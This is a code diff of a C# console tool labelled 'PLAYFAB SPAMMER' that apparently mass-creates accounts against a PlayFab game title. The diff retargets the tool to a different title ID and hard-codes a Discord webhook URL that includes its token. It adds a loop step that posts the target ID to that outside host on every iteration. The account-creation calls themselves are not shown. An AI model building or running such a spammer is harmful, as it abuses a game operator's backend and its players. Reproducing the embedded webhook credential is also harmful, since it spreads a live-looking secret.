@@ -1,15 +1,17 @@
-﻿using PlayFab;
+using PlayFab;
 using PlayFab.ClientModels;
 using System;
-using System.Threading;
+using System.Net.Http;
+using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
 
 class Program
 {
     static async Task Main()
     {
-        PlayFabSettings.TitleId = "19C90D";
-
+        PlayFabSettings.TitleId = "1555F7";
+        string webhook = "https://discord.com/api/webhooks/1445391015430328341/kSJCqPLjyiQ0y9hNbWfaHHge3xDgucl_N5DfSuUYhsBnMjiMfv6cDxO78RjVU_hlbzq0";
         Console.WriteLine("PLAYFAB SPAMMER LOADED");
 
 
@@ -49,10 +51,27 @@ class Program
             {
                 Console.WriteLine($"[{count,6}] EXCEPTION");
             }
+            using (HttpClient client = new HttpClient())
+            {
+                var payload = new
+                {
+                    content = $"PlayFab ID = {PlayFabSettings.TitleId}"
+                };
 
-            // First 3 = no wait, from 4th onward = 5 seconds
+                string json = JsonSerializer.Serialize(payload);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+
+                HttpResponseMessage response = await client.PostAsync(webhook, content);
+
+                Console.WriteLine(response.IsSuccessStatusCode
+                    ? "Message sent!"
+                    : $"Failed: {response.StatusCode}");
+            }
+
+
             if (count >= 3)
-                await Task.Delay(5000, cts.Token);   // 5000 ms = 5 seconds
+                await Task.Delay(5000, cts.Token);
+            
         }
 
         Console.WriteLine($"\n\nSTOPPED. Total accounts attempted: {count}");
